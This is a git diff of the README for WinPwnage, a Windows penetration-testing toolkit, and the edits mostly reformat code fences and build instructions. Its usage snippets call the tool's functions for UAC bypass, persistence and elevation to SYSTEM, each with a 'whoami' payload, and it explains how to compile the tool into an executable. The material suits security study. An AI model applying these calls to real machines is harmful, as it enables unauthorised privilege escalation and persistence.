@@ -280,25 +280,25 @@ The goal of this repo is to study the Windows penetration techniques. Techniques
 
 ## Installing:
 If you're running on python version 3.4 or higher then you don't have to install anything. If you're running python2 or earlier versions of python3, please use the pip command below.
-```
+```batch
 pip install -r requirements.txt
 ```
 
 ## Importing module:
 Bypass UAC using uacMethod2 with params on payload
-```
+```python
 from winpwnage.functions.uac.uacMethod2 import uacMethod2
 uacMethod2(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
 ```
 
 Persist on system using persistMethod4
-```
+```python
 from winpwnage.functions.persist.persistMethod4 import persistMethod4
 persistMethod4(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
 ```
 
 Elevate from administrator to system using elevateMethod1
-```
+```python
 from winpwnage.functions.persist.elevateMethod1 import elevateMethod1
 elevateMethod1(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
 ```
@@ -307,15 +307,17 @@ elevateMethod1(["c:\\windows\\system32\\cmd.exe", "/k", "whoami"])
 When building executable on Windows 10, Access Denied errors can accure while compiling, rerun until success or elevate the prompt.
 
 #### Using PyInstaller:
-This build works on both Python 2 and Python 3 and puts the .exe file into the __dist__ directory.
-```
+This build works on both Python 2 and Python 3 and puts the .exe file into the __dist__ directory. Install pyinstaller using pip command:
+```batch
 pip install pyinstaller
+```
+And run the following command:
+```batch
 pyinstaller --onefile winpwnage.py
 ```
-
 #### Using py2exe
 In order for a successful build, install the py2exe (http://www.py2exe.org) module and use the provided build.py script to compile all the scripts in to a portable executable.  This only seems to work on Python 2, not on Python 3.
-```
+```batch
 python build.py winpwnage.py
 ```
 
